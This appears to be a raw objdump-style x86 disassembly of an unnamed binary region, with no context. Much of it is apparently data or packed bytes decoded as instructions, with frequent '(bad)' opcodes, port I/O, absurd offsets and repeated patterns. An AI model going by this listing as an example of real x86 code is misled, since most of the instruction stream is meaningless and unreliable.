  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
